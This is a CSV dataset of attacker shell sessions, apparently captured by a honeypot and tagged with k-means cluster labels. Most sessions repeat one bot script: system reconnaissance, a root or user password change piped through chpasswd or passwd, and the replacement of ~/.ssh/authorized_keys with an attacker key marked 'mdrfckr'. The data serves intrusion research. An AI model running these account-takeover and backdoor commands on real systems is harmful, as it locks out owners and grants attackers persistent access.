session,SeededKmeans_result,Unnamed: 0,duration,command_freq,input
9d7be25a54eb,1,4544,14.5110821723938,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
9d7be25a54eb,1,4545,14.5110821723938,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
9d7be25a54eb,1,4546,14.5110821723938,15,ls -lh $(which ls)
9d7be25a54eb,1,4547,14.5110821723938,15,which ls
9d7be25a54eb,1,4548,14.5110821723938,15,crontab -l
9d7be25a54eb,1,4549,14.5110821723938,15,w
9d7be25a54eb,1,4550,14.5110821723938,15,uname -m
9d7be25a54eb,1,4551,14.5110821723938,15,cat /proc/cpuinfo | grep model | grep name | wc -l
9d7be25a54eb,1,4552,14.5110821723938,15,top
9d7be25a54eb,1,4553,14.5110821723938,15,uname
9d7be25a54eb,1,4554,14.5110821723938,15,uname -a
9d7be25a54eb,1,4555,14.5110821723938,15,lscpu | grep Model
9d7be25a54eb,1,4556,14.5110821723938,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
d110240d3949,1,4557,14.96176815032959,15,cat /proc/cpuinfo | grep name | wc -l
d110240d3949,1,4558,14.96176815032959,15,"echo ""root:yXdBVNxHYk1y""|chpasswd|bash"
d110240d3949,1,4559,14.96176815032959,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
d110240d3949,1,4560,14.96176815032959,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
d110240d3949,1,4561,14.96176815032959,15,ls -lh $(which ls)
d110240d3949,1,4562,14.96176815032959,15,which ls
d110240d3949,1,4563,14.96176815032959,15,crontab -l
d110240d3949,1,4564,14.96176815032959,15,w
d110240d3949,1,4565,14.96176815032959,15,uname -m
d110240d3949,1,4566,14.96176815032959,15,cat /proc/cpuinfo | grep model | grep name | wc -l
d110240d3949,1,4567,14.96176815032959,15,top
d110240d3949,1,4568,14.96176815032959,15,uname
d110240d3949,1,4569,14.96176815032959,15,uname -a
d110240d3949,1,4570,14.96176815032959,15,lscpu | grep Model
d110240d3949,1,4571,14.96176815032959,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
b6835eb76754,1,4572,11.93402624130249,18,cat /proc/cpuinfo | grep name | wc -l
b6835eb76754,1,4573,11.93402624130249,18,"echo -e ""1q2w3e\nXYk22phazhaw\nXYk22phazhaw""|passwd|bash"
b6835eb76754,1,4574,11.93402624130249,18,Enter new UNIX password: 
b6835eb76754,1,4575,11.93402624130249,18,Enter new UNIX password:
b6835eb76754,1,4576,11.93402624130249,18,"echo ""1q2w3e\nXYk22phazhaw\nXYk22phazhaw\n""|passwd"
b6835eb76754,1,4577,11.93402624130249,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
b6835eb76754,1,4578,11.93402624130249,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
b6835eb76754,1,4579,11.93402624130249,18,ls -lh $(which ls)
b6835eb76754,1,4580,11.93402624130249,18,which ls
b6835eb76754,1,4581,11.93402624130249,18,crontab -l
b6835eb76754,1,4582,11.93402624130249,18,w
b6835eb76754,1,4583,11.93402624130249,18,uname -m
b6835eb76754,1,4584,11.93402624130249,18,cat /proc/cpuinfo | grep model | grep name | wc -l
b6835eb76754,1,4585,11.93402624130249,18,top
b6835eb76754,1,4586,11.93402624130249,18,uname
b6835eb76754,1,4587,11.93402624130249,18,uname -a
b6835eb76754,1,4588,11.93402624130249,18,lscpu | grep Model
b6835eb76754,1,4589,11.93402624130249,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
6582fbb7b0d5,1,4590,21.68572306632996,15,cat /proc/cpuinfo | grep name | wc -l
6582fbb7b0d5,1,4591,21.68572306632996,15,"echo ""root:1QB4x1GUsmTf""|chpasswd|bash"
6582fbb7b0d5,1,4592,21.68572306632996,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
6582fbb7b0d5,1,4593,21.68572306632996,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
6582fbb7b0d5,1,4594,21.68572306632996,15,ls -lh $(which ls)
6582fbb7b0d5,1,4595,21.68572306632996,15,which ls
6582fbb7b0d5,1,4596,21.68572306632996,15,crontab -l
6582fbb7b0d5,1,4597,21.68572306632996,15,w
6582fbb7b0d5,1,4598,21.68572306632996,15,uname -m
6582fbb7b0d5,1,4599,21.68572306632996,15,cat /proc/cpuinfo | grep model | grep name | wc -l
6582fbb7b0d5,1,4600,21.68572306632996,15,top
6582fbb7b0d5,1,4601,21.68572306632996,15,uname
6582fbb7b0d5,1,4602,21.68572306632996,15,uname -a
6582fbb7b0d5,1,4603,21.68572306632996,15,lscpu | grep Model
6582fbb7b0d5,1,4604,21.68572306632996,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
466dbe7f019a,1,4605,13.424179792404177,15,cat /proc/cpuinfo | grep name | wc -l
466dbe7f019a,1,4606,13.424179792404177,15,"echo ""root:MOWIyUlonwPE""|chpasswd|bash"
466dbe7f019a,1,4608,13.424179792404177,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
466dbe7f019a,1,4610,13.424179792404177,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
466dbe7f019a,1,4612,13.424179792404177,15,ls -lh $(which ls)
466dbe7f019a,1,4613,13.424179792404177,15,which ls
466dbe7f019a,1,4615,13.424179792404177,15,crontab -l
466dbe7f019a,1,4618,13.424179792404177,15,w
466dbe7f019a,1,4620,13.424179792404177,15,uname -m
466dbe7f019a,1,4622,13.424179792404177,15,cat /proc/cpuinfo | grep model | grep name | wc -l
466dbe7f019a,1,4624,13.424179792404177,15,top
466dbe7f019a,1,4626,13.424179792404177,15,uname
466dbe7f019a,1,4628,13.424179792404177,15,uname -a
466dbe7f019a,1,4630,13.424179792404177,15,lscpu | grep Model
466dbe7f019a,1,4632,13.424179792404177,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
90f34d112f3f,1,4607,13.38382053375244,15,cat /proc/cpuinfo | grep name | wc -l
90f34d112f3f,1,4609,13.38382053375244,15,"echo ""root:8KUmwLqWDUH0""|chpasswd|bash"
90f34d112f3f,1,4611,13.38382053375244,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
90f34d112f3f,1,4614,13.38382053375244,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
90f34d112f3f,1,4616,13.38382053375244,15,ls -lh $(which ls)
90f34d112f3f,1,4617,13.38382053375244,15,which ls
90f34d112f3f,1,4619,13.38382053375244,15,crontab -l
90f34d112f3f,1,4621,13.38382053375244,15,w
90f34d112f3f,1,4623,13.38382053375244,15,uname -m
90f34d112f3f,1,4625,13.38382053375244,15,cat /proc/cpuinfo | grep model | grep name | wc -l
90f34d112f3f,1,4627,13.38382053375244,15,top
90f34d112f3f,1,4629,13.38382053375244,15,uname
90f34d112f3f,1,4631,13.38382053375244,15,uname -a
90f34d112f3f,1,4633,13.38382053375244,15,lscpu | grep Model
90f34d112f3f,1,4634,13.38382053375244,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
6fcc24543202,1,4635,55.67803883552551,15,cat /proc/cpuinfo | grep name | wc -l
6fcc24543202,1,4636,55.67803883552551,15,"echo ""root:d0yiVqrXxKMt""|chpasswd|bash"
6fcc24543202,1,4637,55.67803883552551,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
6fcc24543202,1,4638,55.67803883552551,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
6fcc24543202,1,4639,55.67803883552551,15,ls -lh $(which ls)
6fcc24543202,1,4640,55.67803883552551,15,which ls
6fcc24543202,1,4642,55.67803883552551,15,crontab -l
6fcc24543202,1,4644,55.67803883552551,15,w
6fcc24543202,1,4646,55.67803883552551,15,uname -m
6fcc24543202,1,4648,55.67803883552551,15,cat /proc/cpuinfo | grep model | grep name | wc -l
6fcc24543202,1,4651,55.67803883552551,15,top
6fcc24543202,1,4653,55.67803883552551,15,uname
6fcc24543202,1,4655,55.67803883552551,15,uname -a
6fcc24543202,1,4657,55.67803883552551,15,lscpu | grep Model
6fcc24543202,1,4659,55.67803883552551,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
0ce9674f29ef,1,4641,55.70762872695923,15,cat /proc/cpuinfo | grep name | wc -l
0ce9674f29ef,1,4643,55.70762872695923,15,"echo ""root:J55hcPmB39fx""|chpasswd|bash"
0ce9674f29ef,1,4645,55.70762872695923,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
0ce9674f29ef,1,4647,55.70762872695923,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
0ce9674f29ef,1,4649,55.70762872695923,15,ls -lh $(which ls)
0ce9674f29ef,1,4650,55.70762872695923,15,which ls
0ce9674f29ef,1,4652,55.70762872695923,15,crontab -l
0ce9674f29ef,1,4654,55.70762872695923,15,w
0ce9674f29ef,1,4656,55.70762872695923,15,uname -m
0ce9674f29ef,1,4658,55.70762872695923,15,cat /proc/cpuinfo | grep model | grep name | wc -l
0ce9674f29ef,1,4660,55.70762872695923,15,top
0ce9674f29ef,1,4661,55.70762872695923,15,uname
0ce9674f29ef,1,4662,55.70762872695923,15,uname -a
0ce9674f29ef,1,4663,55.70762872695923,15,lscpu | grep Model
0ce9674f29ef,1,4664,55.70762872695923,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
7e4422daa00f,1,4665,87.31602311134338,18,cat /proc/cpuinfo | grep name | wc -l
7e4422daa00f,1,4666,87.31602311134338,18,"echo -e ""vanessa\n7vldCFlrr4Eb\n7vldCFlrr4Eb""|passwd|bash"
7e4422daa00f,1,4667,87.31602311134338,18,Enter new UNIX password: 
7e4422daa00f,1,4668,87.31602311134338,18,Enter new UNIX password:
7e4422daa00f,1,4669,87.31602311134338,18,"echo ""vanessa\n7vldCFlrr4Eb\n7vldCFlrr4Eb\n""|passwd"
7e4422daa00f,1,4670,87.31602311134338,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
7e4422daa00f,1,4671,87.31602311134338,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
7e4422daa00f,1,4672,87.31602311134338,18,ls -lh $(which ls)
7e4422daa00f,1,4673,87.31602311134338,18,which ls
7e4422daa00f,1,4674,87.31602311134338,18,crontab -l
7e4422daa00f,1,4675,87.31602311134338,18,w
7e4422daa00f,1,4676,87.31602311134338,18,uname -m
7e4422daa00f,1,4677,87.31602311134338,18,cat /proc/cpuinfo | grep model | grep name | wc -l
7e4422daa00f,1,4678,87.31602311134338,18,top
7e4422daa00f,1,4679,87.31602311134338,18,uname
7e4422daa00f,1,4680,87.31602311134338,18,uname -a
7e4422daa00f,1,4681,87.31602311134338,18,lscpu | grep Model
7e4422daa00f,1,4682,87.31602311134338,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
b3edc60174ec,1,4683,107.49878787994383,18,cat /proc/cpuinfo | grep name | wc -l
b3edc60174ec,1,4684,107.49878787994383,18,"echo -e ""web85p1\n4SYeb41HL1Kg\n4SYeb41HL1Kg""|passwd|bash"
b3edc60174ec,1,4685,107.49878787994383,18,Enter new UNIX password: 
b3edc60174ec,1,4686,107.49878787994383,18,Enter new UNIX password:
b3edc60174ec,1,4687,107.49878787994383,18,"echo ""web85p1\n4SYeb41HL1Kg\n4SYeb41HL1Kg\n""|passwd"
b3edc60174ec,1,4688,107.49878787994383,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
b3edc60174ec,1,4689,107.49878787994383,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
b3edc60174ec,1,4690,107.49878787994383,18,ls -lh $(which ls)
b3edc60174ec,1,4691,107.49878787994383,18,which ls
b3edc60174ec,1,4692,107.49878787994383,18,crontab -l
b3edc60174ec,1,4693,107.49878787994383,18,w
b3edc60174ec,1,4694,107.49878787994383,18,uname -m
b3edc60174ec,1,4695,107.49878787994383,18,cat /proc/cpuinfo | grep model | grep name | wc -l
b3edc60174ec,1,4696,107.49878787994383,18,top
b3edc60174ec,1,4697,107.49878787994383,18,uname
b3edc60174ec,1,4698,107.49878787994383,18,uname -a
b3edc60174ec,1,4699,107.49878787994383,18,lscpu | grep Model
b3edc60174ec,1,4700,107.49878787994383,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
f2b872214bdb,1,4701,151.2511432170868,14,cat /proc/cpuinfo | grep name | wc -l
f2b872214bdb,1,4702,151.2511432170868,14,"echo ""root:oz9J2WLslwaT""|chpasswd|bash"
f2b872214bdb,1,4703,151.2511432170868,14,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
f2b872214bdb,1,4705,151.2511432170868,14,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
f2b872214bdb,1,4706,151.2511432170868,14,ls -lh $(which ls)
f2b872214bdb,1,4707,151.2511432170868,14,which ls
f2b872214bdb,1,4709,151.2511432170868,14,crontab -l
f2b872214bdb,1,4711,151.2511432170868,14,w
f2b872214bdb,1,4712,151.2511432170868,14,uname -m
f2b872214bdb,1,4714,151.2511432170868,14,cat /proc/cpuinfo | grep model | grep name | wc -l
f2b872214bdb,1,4717,151.2511432170868,14,top
f2b872214bdb,1,4720,151.2511432170868,14,uname -a
f2b872214bdb,1,4721,151.2511432170868,14,lscpu | grep Model
f2b872214bdb,1,4723,151.2511432170868,14,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
7215208bbc91,1,4704,181.1101269721985,15,cat /proc/cpuinfo | grep name | wc -l
7215208bbc91,1,4708,181.1101269721985,15,"echo ""root:YC3YY5VSAFJR""|chpasswd|bash"
7215208bbc91,1,4710,181.1101269721985,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
7215208bbc91,1,4713,181.1101269721985,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
7215208bbc91,1,4715,181.1101269721985,15,ls -lh $(which ls)
7215208bbc91,1,4716,181.1101269721985,15,which ls
7215208bbc91,1,4718,181.1101269721985,15,crontab -l
7215208bbc91,1,4719,181.1101269721985,15,w
7215208bbc91,1,4722,181.1101269721985,15,uname -m
7215208bbc91,1,4724,181.1101269721985,15,cat /proc/cpuinfo | grep model | grep name | wc -l
7215208bbc91,1,4725,181.1101269721985,15,top
7215208bbc91,1,4726,181.1101269721985,15,uname
7215208bbc91,1,4727,181.1101269721985,15,uname -a
7215208bbc91,1,4728,181.1101269721985,15,lscpu | grep Model
7215208bbc91,1,4729,181.1101269721985,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
01726df5437d,1,4730,60.86350989341736,15,cat /proc/cpuinfo | grep name | wc -l
01726df5437d,1,4731,60.86350989341736,15,"echo ""root:MMaBvkxFYqbb""|chpasswd|bash"
01726df5437d,1,4732,60.86350989341736,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
01726df5437d,1,4733,60.86350989341736,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
01726df5437d,1,4734,60.86350989341736,15,ls -lh $(which ls)
01726df5437d,1,4735,60.86350989341736,15,which ls
01726df5437d,1,4736,60.86350989341736,15,crontab -l
01726df5437d,1,4737,60.86350989341736,15,w
01726df5437d,1,4738,60.86350989341736,15,uname -m
01726df5437d,1,4739,60.86350989341736,15,cat /proc/cpuinfo | grep model | grep name | wc -l
01726df5437d,1,4740,60.86350989341736,15,top
01726df5437d,1,4741,60.86350989341736,15,uname
01726df5437d,1,4742,60.86350989341736,15,uname -a
01726df5437d,1,4743,60.86350989341736,15,lscpu | grep Model
01726df5437d,1,4744,60.86350989341736,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
5f3d5acc2a2a,1,4745,87.25334286689758,18,cat /proc/cpuinfo | grep name | wc -l
5f3d5acc2a2a,1,4746,87.25334286689758,18,"echo -e ""1\nnatYFjz3tRYm\nnatYFjz3tRYm""|passwd|bash"
5f3d5acc2a2a,1,4747,87.25334286689758,18,Enter new UNIX password: 
5f3d5acc2a2a,1,4748,87.25334286689758,18,Enter new UNIX password:
5f3d5acc2a2a,1,4749,87.25334286689758,18,"echo ""1\nnatYFjz3tRYm\nnatYFjz3tRYm\n""|passwd"
5f3d5acc2a2a,1,4750,87.25334286689758,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
5f3d5acc2a2a,1,4751,87.25334286689758,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
5f3d5acc2a2a,1,4752,87.25334286689758,18,ls -lh $(which ls)
5f3d5acc2a2a,1,4753,87.25334286689758,18,which ls
